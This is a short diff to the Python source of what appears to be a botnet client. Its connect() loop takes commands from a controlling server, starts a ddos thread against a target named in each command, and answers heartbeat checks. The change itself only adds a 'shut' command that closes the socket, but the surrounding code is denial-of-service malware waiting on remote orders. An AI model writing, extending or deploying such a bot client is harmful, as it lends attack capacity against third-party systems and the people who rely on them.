@@ -111,6 +111,10 @@ def connect():
                 Thread(target=ddos, args=(recvdata.split('_')[1], recvdata.split("_")[2],)).start()
             if recvdata == 'heartbeat':
                 s.send("heartbeat".encode("utf8"))
+            if recvdata == 'shut':
+                print('[*]shutdown the connection')
+                s.close()
+                return True # Shutdown
     except Exception as e:
         print(e)
         s.close()
